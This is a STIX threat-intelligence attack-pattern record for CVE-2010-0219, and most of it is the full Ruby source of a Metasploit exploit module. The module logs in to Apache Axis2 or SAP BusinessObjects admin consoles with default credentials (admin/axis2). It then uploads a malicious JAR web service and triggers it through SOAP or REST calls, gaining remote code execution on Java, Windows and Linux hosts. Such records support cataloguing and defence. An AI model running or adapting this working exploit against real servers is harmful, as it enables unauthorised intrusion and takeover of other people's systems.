{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b5998dec-3d5a-4d8b-9d48-bbe0a96f0346",
    "created": "2024-08-14T17:10:32.697672Z",
    "modified": "2024-08-14T17:10:32.697676Z",
    "name": "Axis2 / SAP BusinessObjects Authenticated Code Execution (via SOAP)",
    "description": " This module logs in to an Axis2 Web Admin Module instance using a specific user/pass and uploads and executes commands via deploying a malicious web service by using SOAP.  'References'      => [ # General",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/axis2_deployer.rb",
            "external_id": "axis2_deployer.rb"
        },
        {
            "source_name": "reference",
            "url": "http://spl0it.org/files/talks/source_barcelona10/Hacking%20SAP%20BusinessObjects.pdf"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0219"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /Apache.*(Coyote|Tomcat)|Jetty.*/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'Axis2 / SAP BusinessObjects Authenticated Code Execution (via SOAP)',\n      'Description'     => %q{\n        This module logs in to an Axis2 Web Admin Module instance using a specific user/pass\n        and uploads and executes commands via deploying a malicious web service by using SOAP.\n      },\n      'References'      =>\n        [\n          # General\n          [ 'URL', 'http://www.rapid7.com/security-center/advisories/R7-0037.jsp' ],\n          [ 'URL', 'http://spl0it.org/files/talks/source_barcelona10/Hacking%20SAP%20BusinessObjects.pdf' ],\n          [ 'CVE', '2010-0219' ],\n          [ 'OSVDB', '68662' ]\n        ],\n      'Platform'        => %w{ java linux win }, # others?\n      'Targets'         =>\n        [\n          [ 'Java', {\n                'Arch' => ARCH_JAVA,\n                'Platform' => 'java'\n              },\n          ],\n          #\n          # Platform specific targets only\n          #\n          [ 'Windows Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            },\n          ],\n          [ 'Linux X86',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux'\n            },\n          ],\n        ],\n      'DefaultTarget'   => 0,\n      'DisclosureDate'  => '2010-12-30',\n      'Author'          =>\n        [\n          'Joshua Abraham <jabra[at]rapid7.com>', # original module\n          'Chris John Riley' # modifications\n        ],\n      'License'         => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('USERNAME', [ true, 'The username to authenticate as','admin' ]),\n        OptString.new('PASSWORD', [ true, 'The password for the specified username','axis2' ]),\n        OptString.new('PATH', [ true,  \"The URI path of the axis2 app (use /dswsbobje for SAP BusinessObjects)\", '/axis2'])\n      ])\n    register_autofilter_ports([ 8080 ])\n  end\n\n  def upload_exec(session,rpath)\n    contents=''\n    name = Rex::Text.rand_text_alpha(8)\n\n    # We must register this file early, that way the on_new_session method\n    # won't miss it if FileDropper's cleanup routine kicks in.\n    register_file_for_cleanup(\"webapps#{rpath}/WEB-INF/services/#{name}.jar\")\n\n    services_xml = %Q{\n<service name=\"#{name}\" scope=\"application\">\n  <description>\n    #{Rex::Text.rand_text_alphanumeric(50 + rand(50))}\n  </description>\n  <messageReceivers>\n    <messageReceiver\n      mep=\"http://www.w3.org/2004/08/wsdl/in-only\"\n      class=\"org.apache.axis2.rpc.receivers.RPCInOnlyMessageReceiver\"/>\n    <messageReceiver\n      mep=\"http://www.w3.org/2004/08/wsdl/in-out\"\n      class=\"org.apache.axis2.rpc.receivers.RPCMessageReceiver\"/>\n  </messageReceivers>\n  <parameter name=\"ServiceClass\">\n    metasploit.PayloadServlet\n  </parameter>\n</service>\n}\n    if target.name =~ /Java/\n      zip = payload.encoded_jar\n      zip.add_file(\"META-INF/services.xml\", services_xml)\n\n      # We need this class as a wrapper to run in a thread.  For some reason\n      # the Payload class is giving illegal access exceptions without it.\n      servlet = MetasploitPayloads.read('java', 'metasploit', 'PayloadServlet.class')\n      zip.add_file(\"metasploit/PayloadServlet.class\", servlet)\n\n      contents = zip.pack\n    end\n\n    boundary = rand_text_alphanumeric(6)\n\n    data = \"--#{boundary}\\r\\nContent-Disposition: form-data; name=\\\"filename\\\"; \"\n    data << \"filename=\\\"#{name}.jar\\\"\\r\\nContent-Type: application/java-archive\\r\\n\\r\\n\"\n    data << contents\n    data << \"\\r\\n--#{boundary}--\"\n\n    res = send_request_raw({\n      'uri'     => \"#{rpath}/axis2-admin/upload\",\n      'method'  => 'POST',\n      'data'    => data,\n      'headers' =>\n        {\n          'Content-Type'\t => 'multipart/form-data; boundary=' + boundary,\n          'Cookie' => \"JSESSIONID=#{session}\",\n        }\n    }, 25)\n\n    if (res and res.code == 200)\n      print_good(\"Successfully uploaded\")\n    else\n      print_error(\"Error uploading #{res}\")\n      return\n    end\n=begin\n  res = send_request_raw({\n    'uri'\t => \"/#{datastore['PATH']}/axis2-web/HappyAxis.jsp\",\n    'method'\t => 'GET',\n    'headers' =>\n    {\n      'Cookie' => \"JSESSIONID=#{session}\",\n      }\n    }, 25)\n  puts res.body\n  puts res.code\n  if res.code > 200 and res.code < 300\n    if ( res.body.scan(/([A-Z] \\Program Files\\Apache Software Foundation\\Tomcat \\d.\\d)/i) )\n      dir = $1.sub(/: /,':') + \"\\\\webapps\\\\dswsbobje\\\\WEB-INF\\\\services\\\\\"\n      puts dir\n    else\n      if ( a.scan(/catalina\\.home<\\/th><td style=\".*\">(.*)&nbsp;<\\/td>/i) )\n        dir = $1 + \"/webapps/dswsbobje/WEB-INF/services/\"\n        puts dir\n      end\n    end\n  end\n=end\n\n    print_status(\"Polling to see if the service is ready\")\n\n    res_rest = send_request_raw({\n      'uri'\t  => \"#{rpath}/services\",\n      'method'\t => 'GET',\n    }, 25)\n\n    soapenv='http://schemas.xmlsoap.org/soap/envelope/'\n    xmlns='http://session.dsws.businessobjects.com/2007/06/01'\n    xsi='http://www.w3.org/2001/XMLSchema-instance'\n\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\"?>' + \"\\r\\n\"\n    data << '<soapenv:Envelope xmlns:soapenv=\"' +\t soapenv + '\"  xmlns:ns=\"' + xmlns + '\">' + \"\\r\\n\"\n    data << '<soapenv:Header/>' + \"\\r\\n\"\n    data << '<soapenv:Body>' + \"\\r\\n\"\n    data << '<soapenv:run/>' + \"\\r\\n\"\n    data << '</soapenv:Body>' + \"\\r\\n\"\n    data << '</soapenv:Envelope>' + \"\\r\\n\\r\\n\"\n\n    begin\n      p = /Please enable REST/\n      catch :stop do\n        1.upto 5 do\n          Rex::ThreadSafe.sleep(3)\n\n          if (res_rest and res_rest.code == 200 and res_rest.body.match(p) != nil)\n            # Try to execute the payload\n            res = send_request_raw({\n              'uri'\t  => \"#{rpath}/services/#{name}\",\n              'method'  => 'POST',\n              'data'\t  => data,\n              'headers' =>\n                {\n                  'Content-Length' => data.length,\n                  'SOAPAction'     => '\"' + 'http://session.dsws.businessobjects.com/2007/06/01/run' + '\"',\n                  'Content-Type'   => 'text/xml; charset=UTF-8',\n                }\n            }, 15)\n          else\n            ## rest\n            res = send_request_raw({\n              'uri'     => \"#{rpath}/services/#{name}/run\",\n              'method'  => 'GET',\n              'headers' =>\n              {\n                'cookie' => \"jsessionid=#{session}\",\n              }\n            }, 25)\n\n            if not (res.code > 200 and res.code < 300)\n              ## rest alternative path (use altres as a 200 is returned regardless)\n              altres = send_request_raw({\n                'uri'\t  => \"#{rpath}/rest/#{name}/run\",\n                'method'  => 'GET',\n                'headers' =>\n                {\n                  'cookie' => \"jsessionid=#{session}\",\n                }\n              }, 25)\n            end\n          end\n\n          if res and res.code > 200 and res.code < 300\n            throw :stop # exit loop\n          elsif res and res.code == 401\n            if (res.headers['WWW-Authenticate'])\n              authmsg = res.headers['WWW-Authenticate']\n            end\n            print_error(\"The remote server responded expecting authentication\")\n            if authmsg\n              print_error(\"WWW-Authenticate: %s\" % authmsg)\n            end\n            raise ::Rex::ConnectionError\n            throw :stop # exit loop\n          end\n        end\n      end\n    rescue ::Rex::ConnectionError\n      print_error(\"http://#{rhost}:#{rport}#{rpath}/(rest|services) Unable to authenticate (#{res.code} #{res.message})\")\n    end\n  end\n\n  def exploit\n    user = datastore['USERNAME']\n    pass = datastore['PASSWORD']\n    rpath = normalize_uri(datastore['PATH'])\n\n    success = false\n    srvhdr = '?'\n    begin\n      res = send_request_cgi(\n        {\n          'method' => 'POST',\n          'uri'    => normalize_uri(rpath, '/axis2-admin/login'),\n          'ctype'  => 'application/x-www-form-urlencoded',\n          'data'   => \"userName=#{user}&password=#{pass}&submit=+Login+\",\n        }, 25)\n\n        if not (res.kind_of? Rex::Proto::Http::Response)\n          print_error(\"http://#{rhost}:#{rport}#{rpath}/axis2-admin not responding\")\n        end\n\n        if res.code == 404\n          print_error(\"http://#{rhost}:#{rport}#{rpath}/axis2-admin returned code 404\")\n        end\n\n        srvhdr = res.headers['Server']\n        if res.code == 200\n          # Could go with res.headers[\"Server\"] =~ /Apache-Coyote/i\n          # as well but that seems like an element someone's more\n          # likely to change\n\n          success = true if(res.body.scan(/Welcome to Axis2 Web/i).size == 1)\n          if res.get_cookies =~ /JSESSIONID=(.*);/\n            session = $1\n          end\n        end\n\n    rescue ::Rex::ConnectionError\n      print_error(\"http://#{rhost}:#{rport}#{rpath}/axis2-admin Unable to attempt authentication\")\n    end\n\n\n    if not success and not rpath =~ /dswsbobje/\n      rpath = '/dswsbobje'\n      begin\n        res = send_request_cgi(\n          {\n            'method' => 'POST',\n            'uri'    => normalize_uri(rpath, '/axis2-admin/login'),\n            'ctype'  => 'application/x-www-form-urlencoded',\n            'data'   => \"userName=#{user}&password=#{pass}&submit=+Login+\",\n          }, 25)\n\n        if not (res.kind_of? Rex::Proto::Http::Response)\n          print_error(\"http://#{rhost}:#{rport}#{rpath}/axis2-admin not responding\")\n        end\n\n        if res.code == 404\n          print_error(\"http://#{rhost}:#{rport}#{rpath}/axis2-admin returned code 404\")\n        end\n\n        srvhdr = res.headers['Server']\n        if res.code == 200\n          # Could go with res.headers[\"Server\"] =~ /Apache-Coyote/i\n          # as well but that seems like an element someone's more\n          # likely to change\n\n          success = true if(res.body.scan(/Welcome to Axis2 Web/i).size == 1)\n          if res.get_cookies =~ /JSESSIONID=(.*);/\n            session = $1\n          end\n        end\n\n      rescue ::Rex::ConnectionError\n        print_error(\"http://#{rhost}:#{rport}#{rpath}/axis2-admin Unable to attempt authentication\")\n      end\n    end\n\n    if success\n      print_good(\"http://#{rhost}:#{rport}#{rpath}/axis2-admin [#{srvhdr}] [Axis2 Web Admin Module] successful login '#{user}' : '#{pass}'\")\n      upload_exec(session,rpath)\n    else\n      print_error(\"http://#{rhost}:#{rport}#{rpath}/axis2-admin [#{srvhdr}] [Axis2 Web Admin Module] failed to login as '#{user}'\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2010-12-30",
    "x_mitre_platforms": [
        "linux"
    ]
}